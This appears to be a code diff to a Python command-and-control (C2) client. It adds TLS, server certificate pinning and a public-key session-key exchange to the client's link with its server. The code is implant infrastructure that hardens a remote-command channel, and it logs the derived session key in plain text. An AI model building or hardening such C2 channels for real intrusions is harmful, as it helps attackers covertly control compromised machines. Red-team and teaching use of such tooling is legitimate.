@@ -13,6 +13,7 @@ import logging
 import time
 import uuid
 import base64
+import hashlib
 import argparse
 import subprocess
 from typing import List
@@ -21,6 +22,7 @@ from models.send_receive_msgs import send_message, receive_message
 from models.message_type import MessageType
 from models.command_type import CommandType
 from models.encryption_manager import EncryptionManager
+from models.tls_helper import TLSSessionHelper
 
 # ==================== CONFIGURATION ====================
 
@@ -32,6 +34,22 @@ logger = logging.getLogger(__name__)
 
 # ==================== CORE C2 CLIENT LOGIC ====================
 
+from cryptography import x509
+from cryptography.hazmat.primitives import hashes, serialization
+import base64
+
+def get_spki_hash(der_cert_bytes):
+    cert = x509.load_der_x509_certificate(der_cert_bytes)
+    public_key = cert.public_key()
+    spki_bytes = public_key.public_bytes(
+        encoding=serialization.Encoding.DER,
+        format=serialization.PublicFormat.SubjectPublicKeyInfo
+    )
+    digest = hashes.Hash(hashes.SHA256())
+    digest.update(spki_bytes)
+    return base64.b64encode(digest.finalize()).decode("ascii")
+
+
 class C2Client:
     """Main C2 Client"""
     
@@ -39,7 +57,7 @@ class C2Client:
         self.server_host = server_host
         self.server_port = server_port
         self.client_id = client_id
-        self._encryption_manager = None
+        self._encryption_manager = EncryptionManager()
         self.reader = None
         self.writer = None
         self.running = True
@@ -50,28 +68,43 @@ class C2Client:
         """
         Connect to C2 server and register
         """
+        server_sha = "jPxWXE+5YqcWif1pSG7ixZAVbFY3bI1JhbbtaOcPxFM="
         try:
             is_connected = False
             if not self.running:
                 return False
+            ssl_ctx = TLSSessionHelper().create_context(
+                is_server=False,
+            )
             self.reader, self.writer = await asyncio.open_connection(
                 self.server_host,
-                self.server_port
+                self.server_port,
+                ssl=ssl_ctx,
             )
             logger.info(f"Connected to server at {self.server_host}:{self.server_port}")
-            
+
+            ssl_obj = self.writer.get_extra_info("ssl_object")
+            der_cert = ssl_obj.getpeercert(binary_form=True)
+            server_sha_received = get_spki_hash(der_cert)
+            logger.info(f"Server certificate: {server_sha_received}")
+            logger.info(f"Expected certificate: {server_sha}")
+            if server_sha_received != server_sha:
+                logger.error("Server certificate is not valid")
+                return False
+
             # Send registration message
+            serialized_public_key = self._encryption_manager.serialized_public_key
             await send_message(
                 self.writer,
-                Message.as_register(self.client_id).to_payload(True)
+                Message.as_register(self.client_id, serialized_public_key).to_payload(True)
             )
             
             # Receive acknowledgment
             msg = await receive_message(self.reader)
             msg = Message.from_payload(msg)
             if msg and msg.type is MessageType.ACK:
-                master_key = base64.b64decode(msg.command)
-                self._encryption_manager = EncryptionManager(master_key)
+                self._encryption_manager.compute_session_key(msg.command)
+                logger.info(f"Shared key: {self._encryption_manager.session_key}")
                 logger.info(f"Registered as {msg.client_id}")
                 is_connected = True
             else:
@@ -181,6 +214,9 @@ class C2Client:
                     logger.warning(f"Received an empty message")
                     break
                 msg = self._encryption_manager.decrypt(msg)
+                if not msg:
+                    logger.warning(f"Unexpected: decrypted message is empty")
+                    break
                 
                 if msg.type is MessageType.COMMAND:
                     # Queue command for execution
